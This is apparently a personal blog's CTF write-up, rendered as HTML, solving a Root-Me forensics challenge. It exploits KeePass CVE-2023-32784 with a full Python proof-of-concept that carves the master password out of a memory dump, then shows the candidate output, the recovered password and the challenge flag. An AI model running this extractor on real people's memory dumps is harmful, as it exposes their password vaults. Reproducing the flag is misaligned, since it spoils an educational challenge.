@@ -1,0 +1,702 @@
+<!doctype html>
+<html
+  lang="en-us" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  Master kee root-me | Mohamed Zahir
+</title>
+<meta name="description" content="Offensive Security | Master AI & Emerging Tech Student"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":false,\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/regular.min.css"
+    integrity="sha384-4qYppzjH8EiA&#43;cGdaubu2vL7Rk8WGiqCSj7oRuP1uwtFWkfKNHD20lPfcrbQc8dU" crossorigin="anonymous"/><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/solid.min.css"
+    integrity="sha384-wbMWab3UDSPm2kvIgVOn/d9KPTecgPU1&#43;Nb3zoQrm/oVu0EkPL6IaKinjbwW0rum" crossorigin="anonymous"/><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/brands.min.css"
+    integrity="sha384-KTGeC2hIMzpeQakhsmzB9bZfhCD5xZZCgI1iZH6f/O457SxzlkzTQg/WXFNoi3ih" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v5-font-face.min.css"
+    integrity="sha384-nJ1ThfldViXoLpJ6jlKcP2beas8BMbYq26SG9Hi8cH89bZi4RZ644v7helMCqJxd" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v4-font-face.min.css"
+    integrity="sha384-UlkrhOIvZxJFd4MElSUp7ow6/RUeYKi/orfCZIRRiOENFuQPIAA3T3HjYfmBRhNq" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link rel="stylesheet" href="/css/loader.css" /><meta property="og:type" content="website" />
+  <meta property="og:title" content="Master kee root-me | Mohamed Zahir" />
+  <meta
+    property="og:description"
+    content="Offensive Security | Master AI & Emerging Tech Student"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/2025/2025-03-16-rootme-masterkee/" />
+  <meta
+    property="og:site_name"
+    content="Moza Blog"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Mohamed Zahir" />
+  <meta property="article:published_time" content="0001-01-01T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="0001-01-01T00:00:00&#43;00:00" /><meta property="article:tag" content="forensics" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Initializing system...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+This article does not have a corresponding language version
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/"><div class='main-nav-icon icon '>&#xf015;</div><span class="main-nav-link">Home</span>
+      </a><a class="main-nav-link-wrap" href="/archives"><div class='main-nav-icon icon '>&#xf3ed;</div><span class="main-nav-link">Archives</span>
+      </a><a class="main-nav-link-wrap" href="/about"><div class='main-nav-icon icon '>&#xf522;</div><span class="main-nav-link">About</span>
+      </a><a class="main-nav-link-wrap" href="/friend"><div class='main-nav-icon icon '>&#xf187;</div><span class="main-nav-link">Friend</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"></nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner-image.png" alt="Master kee root-me"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">Master kee root-me</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#step-1-understanding-the-vulnerability">Step 1: Understanding the Vulnerability</a></li>
+    <li><a href="#step-2-using-the-proof-of-concept-script">Step 2: Using the Proof-of-Concept Script</a></li>
+    <li><a href="#step-3-running-the-script">Step 3: Running the Script</a></li>
+    <li><a href="#step-4-analyzing-the-output">Step 4: Analyzing the Output</a></li>
+    <li><a href="#step-5-unlocking-the-keepass-database">Step 5: Unlocking the KeePass Database</a></li>
+    <li><a href="#step-6-success">Step 6: Success!</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Mohamed Zahir"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Mohamed Zahir</div>
+  <div class="sidebar-description">Offensive Security | Master AI &amp; Emerging Tech Student</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">10</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">14</div>
+  </a>
+</div>
+<div class="sidebar-social" ><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/moza369"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div><div class="icon-linkedin sidebar-social-icon">
+      <a
+        href="https://www.linkedin.com/in/mohamed-zahir-24b607295"
+        itemprop="url"
+        target="_blank"
+        aria-label="linkedin"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div><div class="icon-twitter sidebar-social-icon">
+      <a
+        href="https://x.com/M0ZA369"
+        itemprop="url"
+        target="_blank"
+        aria-label="twitter"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a><div class='sidebar-menu-icon icon '>&#xf015;</div><div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a><div class='sidebar-menu-icon icon '>&#xf3ed;</div><div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a><div class='sidebar-menu-icon icon '>&#xf522;</div><div class="sidebar-menu-link">About</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="Friend"
+      ></a><div class='sidebar-menu-icon icon '>&#xf187;</div><div class="sidebar-menu-link">Friend</div>
+    </div></div></div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >0001-01-01</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >0001-01-01</time
+    >
+  </span></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="cracking-the-masterkee-challenge-exploiting-cve-2023-32784">
+<a class="header-anchor" href="#cracking-the-masterkee-challenge-exploiting-cve-2023-32784"></a>
+Cracking the MasterKee Challenge: Exploiting CVE-2023-32784
+</h1><p>For this challenge, we are provided with two files:</p>
+<ul>
+<li><code>MasterKee.DMP</code></li>
+<li><code>Masterkee.kdbx</code></li>
+</ul>
+<p>The goal is to extract the password from the <code>.DMP</code> file and use it to unlock the KeePass database (<code>Masterkee.kdbx</code>). After some research, I discovered that a specific version of KeePass is vulnerable to <strong>CVE-2023-32784</strong>, which allows extracting the master password from a memory dump.</p>
+<hr>
+<h2 id="step-1-understanding-the-vulnerability">
+<a class="header-anchor" href="#step-1-understanding-the-vulnerability"></a>
+Step 1: Understanding the Vulnerability
+</h2><p>CVE-2023-32784 is a vulnerability in KeePass that leaks portions of the master password in memory. By analyzing a memory dump (<code>.DMP</code>), we can recover parts of the password. The missing characters are represented as <code>●</code> in the output.</p>
+<hr>
+<h2 id="step-2-using-the-proof-of-concept-script">
+<a class="header-anchor" href="#step-2-using-the-proof-of-concept-script"></a>
+Step 2: Using the Proof-of-Concept Script
+</h2><p>I found a <a href="https://github.com/">PoC script on GitHub</a> that exploits this vulnerability. Here&rsquo;s the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> itertools
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TaggedFormatter</span>(logging<span style="color:#f92672">.</span>Formatter):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    TAGS <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;DEBUG&#39;</span>: <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;35m#</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;INFO&#39;</span>: <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;34m.</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;WARNING&#39;</span>: <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;33m-</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;ERROR&#39;</span>: <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;31m!</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;CRITICAL&#39;</span>: <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;31m!!</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, format):
+</span></span><span style="display:flex;"><span>        logging<span style="color:#f92672">.</span>Formatter<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span>(self, format)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format</span>(self, record):
+</span></span><span style="display:flex;"><span>        levelname <span style="color:#f92672">=</span> record<span style="color:#f92672">.</span>levelname
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> levelname <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>TAGS:
+</span></span><span style="display:flex;"><span>            record<span style="color:#f92672">.</span>levelname <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>TAGS[levelname]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> logging<span style="color:#f92672">.</span>Formatter<span style="color:#f92672">.</span>format(self, record)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">setup_logging</span>(debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>):
+</span></span><span style="display:flex;"><span>    formatter <span style="color:#f92672">=</span> TaggedFormatter(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%(asctime)s</span><span style="color:#e6db74"> [</span><span style="color:#e6db74">%(levelname)s</span><span style="color:#e6db74">] [</span><span style="color:#e6db74">%(name)s</span><span style="color:#e6db74">] </span><span style="color:#e6db74">%(message)s</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    handler <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>StreamHandler()
+</span></span><span style="display:flex;"><span>    root_logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    handler<span style="color:#f92672">.</span>setFormatter(formatter)
+</span></span><span style="display:flex;"><span>    root_logger<span style="color:#f92672">.</span>addHandler(handler)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> debug:
+</span></span><span style="display:flex;"><span>        root_logger<span style="color:#f92672">.</span>setLevel(logging<span style="color:#f92672">.</span>DEBUG)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        root_logger<span style="color:#f92672">.</span>setLevel(logging<span style="color:#f92672">.</span>INFO)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_args</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;CVE-2023-32784 proof-of-concept&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;dump&#39;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;The path of the memory dump to analyze&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--debug&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_true&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Enable debugging mode&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_candidates</span>(dump_file):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> dump_file<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    candidates <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    str_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> len(data)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (data[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xCF</span>) <span style="color:#f92672">and</span> (data[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x25</span>):
+</span></span><span style="display:flex;"><span>            str_len <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> str_len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (data[i] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">and</span> (data[i] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x7E</span>) <span style="color:#f92672">and</span> (data[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>):
+</span></span><span style="display:flex;"><span>                candidate <span style="color:#f92672">=</span> (str_len <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xCF\x25</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> bytes([data[i], data[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> candidate <span style="color:#f92672">in</span> candidates:
+</span></span><span style="display:flex;"><span>                    candidates<span style="color:#f92672">.</span>append(candidate)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            str_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> candidates
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parse_args()
+</span></span><span style="display:flex;"><span>    setup_logging(args<span style="color:#f92672">.</span>debug)
+</span></span><span style="display:flex;"><span>    logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(<span style="color:#e6db74">&#39;main&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>dump, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> dump_file:
+</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Opened </span><span style="color:#e6db74">{</span>dump_file<span style="color:#f92672">.</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        candidates <span style="color:#f92672">=</span> get_candidates(dump_file)
+</span></span><span style="display:flex;"><span>        candidates <span style="color:#f92672">=</span> [x<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> candidates]
+</span></span><span style="display:flex;"><span>        groups <span style="color:#f92672">=</span> [[] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(max([len(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> candidates]))]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> candidate <span style="color:#f92672">in</span> candidates:
+</span></span><span style="display:flex;"><span>            groups[len(candidate) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>append(candidate[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(groups)):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(groups[i]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                groups[i]<span style="color:#f92672">.</span>append(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xCF\x25</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-16-le&#39;</span>))
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> itertools<span style="color:#f92672">.</span>product(<span style="color:#f92672">*</span>groups):
+</span></span><span style="display:flex;"><span>            password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(password)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Possible password: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><hr>
+<h2 id="step-3-running-the-script">
+<a class="header-anchor" href="#step-3-running-the-script"></a>
+Step 3: Running the Script
+</h2><p>I ran the script against the <code>MasterKee.DMP</code> file, and it produced the following output:</p>
+<pre tabindex="0"><code>➜  forensics python3 exp.py -d MasterKee.DMP
+
+2025-03-10 16:23:37,315 [.] [main] Opened MasterKee.DMP
+
+Possible password: ●ere_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●3re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●&#39;re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●Dre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●\re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●#re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●yre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●kre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●9re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●;re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●Hre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●Bre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●qre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+Possible password: ●are_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
+</code></pre><hr>
+<h2 id="step-4-analyzing-the-output">
+<a class="header-anchor" href="#step-4-analyzing-the-output"></a>
+Step 4: Analyzing the Output
+</h2><p>The script revealed that the first character of the password is missing (<code>●</code>). Based on the context, I guessed that the missing character is likely an <strong><code>H</code></strong>, making the password:</p>
+<p><code>Here_Is_My_V3ry_S3cr3t_P4ssw0rd2024!</code></p>
+<hr>
+<h2 id="step-5-unlocking-the-keepass-database">
+<a class="header-anchor" href="#step-5-unlocking-the-keepass-database"></a>
+Step 5: Unlocking the KeePass Database
+</h2><p>I opened the <code>Masterkee.kdbx</code> file in KeePass and entered the password:</p>
+<p><code>Here_Is_My_V3ry_S3cr3t_P4ssw0rd2024!</code></p>
+<hr>
+<h2 id="step-6-success">
+<a class="header-anchor" href="#step-6-success"></a>
+Step 6: Success!
+</h2><p>The database unlocked, and I found the flag:</p>
+<p><code>RM{Upd4T3_KeEPas5_t0_2.54}</code></p>
+<hr>
+<h2 id="conclusion">
+<a class="header-anchor" href="#conclusion"></a>
+Conclusion
